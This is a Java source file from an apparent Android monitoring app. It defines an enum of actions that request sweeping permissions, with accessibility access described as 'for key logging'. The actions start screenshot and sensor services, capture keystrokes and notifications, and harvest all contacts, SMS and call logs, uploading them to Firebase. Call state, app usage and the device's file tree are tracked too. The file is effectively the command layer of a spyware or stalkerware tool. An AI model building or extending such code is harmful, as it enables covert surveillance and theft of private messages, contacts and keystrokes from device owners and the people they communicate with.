package com.vikasyadavnsit.cdc.enums;

import android.app.Activity;
import android.content.Context;
import android.util.Log;

import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.services.CDCSensorService;
import com.vikasyadavnsit.cdc.services.ScreenshotService;
import com.vikasyadavnsit.cdc.utils.ActionUtils;
import com.vikasyadavnsit.cdc.utils.CallUtils;
import com.vikasyadavnsit.cdc.utils.FileUtils;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.AccessibilityUtils;
import com.vikasyadavnsit.cdc.utils.MessageUtils;

import java.util.function.BiConsumer;

import lombok.AllArgsConstructor;
import lombok.Getter;

@Getter
@AllArgsConstructor
public enum ClickActions {

    REQUEST_ALL_PERMISSION(
            1, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestAllPermissions((Activity) context);
            },
            "Request all permissions in a single stroke",
            "Request all permissions"
    ),
    REQUEST_EXACT_ALARM_PERMISSION(
            2, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                ActionUtils.requestExactAlarmPermission();
            },
            "Request exact alarm permission for precision timing",
            "Request alarm permission"
    ),
    REQUEST_ACCESSIBILITY_PERMISSION(
            3, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestPermission((Activity) context, PermissionType.ACCESSIBILITY_SERVICE);
            },
            "Request accessibility permission for key logging",
            "Request accessibility permission"
    ),
    REQUEST_SMS_PERMISSION(
            4, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestPermission((Activity) context, PermissionType.READ_SMS);
            },
            "Request SMS reading permission",
            "Request SMS permission"
    ),
    REQUEST_FILE_ACCESS_PERMISSION(
            5, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestPermission((Activity) context, PermissionType.MANAGE_EXTERNAL_STORAGE);
            },
            "Request file access permission for storage exploration",
            "Request file access permission"
    ),
    REQUEST_NOTIFICATION_ACCESS(
            6, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestPermission((Activity) context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE);
            },
            "Request notification listener access",
            "Request notification access"
    ),
    REQUEST_USAGE_STATS_ACCESS(
            7, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestPermission((Activity) context, PermissionType.PACKAGE_USAGE_STATS);
            },
            "Request app usage statistics access",
            "Request usage access"
    ),
    REQUEST_BATTERY_OPTIMIZATION(
            8, ClickActionCategory.PERMISSIONS,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestPermission((Activity) context, PermissionType.BATTERY_OPTIMIZATION);
            },
            "Request to ignore battery optimizations",
            "Request battery optimization"
    ),
    START_SENSOR_SERVICE(
            9, ClickActionCategory.SERVICES,
            (context, triggerSettingsData) -> {
                if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    CDCSensorService.startSensorService((Activity) context);
                } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                    CDCSensorService.stopSensorService((Activity) context);
                }
            },
            "Start/Stop sensor service for real-time data",
            "Start sensor service"
    ),
    START_SCREENSHOT_SERVICE(
            10, ClickActionCategory.SERVICES,
            (context, triggerSettingsData) -> {
                if (ActionStatus.PREPARE.equals(triggerSettingsData.getActionStatus())) {
                    ActionUtils.startMediaProjectionService((Activity) context);
                } else if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    int maxRepetitions = triggerSettingsData.getMaxRepetitions();
                    for (int i = 0; i < maxRepetitions; i++) {
                        ScreenshotService.setTakeScreenshot(true);
                        try {
                            Thread.sleep(triggerSettingsData.getInterval());
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                    }
                } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                    ScreenshotService.setStopScreenshotService(true);
                }
            },
            "Start/Stop screenshot capture service",
            "Start screenshot service"
    ),
    CAPTURE_ALL_CONTACTS(
            11, ClickActionCategory.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.READ_CONTACTS)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_CONTACTS);
                    return;
                }
                if (triggerSettingsData.isSaveOnLocalFile())
                    FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
                if (triggerSettingsData.isUploadDataSnapshot()) {
                    FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
                }
            },
            "Capture all phone contacts snapshot",
            "Capture contacts"
    ),
    CAPTURE_ALL_SMS(
            12, ClickActionCategory.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.READ_SMS)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_SMS);
                    return;
                }
                if (triggerSettingsData.isSaveOnLocalFile()) {
                    FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages((Activity) context, FileMap.SMS));
                }
                if (triggerSettingsData.isUploadDataSnapshot()) {
                    FirebaseUtils.uploadUserSmsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.SMS));
                }
            },
            "Capture all SMS history",
            "Capture SMS"
    ),
    CAPTURE_ALL_CALL_LOGS(
            13, ClickActionCategory.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.READ_CALL_LOG)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_CALL_LOG);
                    return;
                }
                if (triggerSettingsData.isSaveOnLocalFile())
                    FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages((Activity) context, FileMap.CALL));
                if (triggerSettingsData.isUploadDataSnapshot()) {
                    FirebaseUtils.uploadUserCallLogsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CALL));
                }
            },
            "Capture complete call history",
            "Capture call"
    ),
    CAPTURE_KEY_STROKES(
            14, ClickActionCategory.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.ACCESSIBILITY_SERVICE)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.ACCESSIBILITY_SERVICE);
                    return;
                }
            },
            "Capture key strokes via accessibility",
            "Capture key strokes"
    ), 
    CAPTURE_NOTIFICATIONS(
            15, ClickActionCategory.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE);
                    return;
                }
            },
            "Capture device notifications",
            "Capture Notification"
    ),
    GET_APP_USAGE_STATISTICS_REPORT(
            16, ClickActionCategory.DATA_CAPTURE,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.PACKAGE_USAGE_STATS)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.PACKAGE_USAGE_STATS);
                    return;
                }
                com.vikasyadavnsit.cdc.services.AppUsageStats.getDailyUsageStats(context);
            },
            "Generate app usage analytics report",
            "Get app usage report"
    ),
    MONITOR_CALL_STATE(
            17, ClickActionCategory.SERVICES,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.READ_PHONE_STATE)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_PHONE_STATE);
                    return;
                }
                CallUtils.monitorCallState((Activity) context);
            },
            "Monitor real-time call states",
            "Monitor call state"
    ),
    MONITOR_PHONE_STATISTICS(
            18, ClickActionCategory.SERVICES,
            (context, triggerSettingsData) -> {
                ActionUtils.registerPhoneStatistics((Activity) context);
            },
            "Monitor system events and statistics",
            "Monitor phone statistics"
    ),
    GET_DIRECTORY_STRUCTURE(
            19, ClickActionCategory.SYSTEM,
            (context, triggerSettingsData) -> {
                if (!new PermissionManager().hasPermission(context, PermissionType.MANAGE_EXTERNAL_STORAGE)) {
                    new PermissionManager().requestPermission((Activity) context, PermissionType.MANAGE_EXTERNAL_STORAGE);
                    return;
                }
                ActionUtils.getDirectoryStructure((Activity) context);
            },
            "Explore device folder hierarchy",
            "Get directory structure"
    ),
    RESET_ALL_PERMISSION(
            20, ClickActionCategory.SYSTEM,
            (context, triggerSettingsData) -> {
                new PermissionManager().resetAllPermissionManually((Activity) context);
            },
            "Wipe all granted permissions",
            "Reset all permissions"
    );

    final int order;
    final ClickActionCategory category;
    final BiConsumer<Context, User.AppTriggerSettingsData> biConsumer;
    final String description;
    final String actionLabel;
}
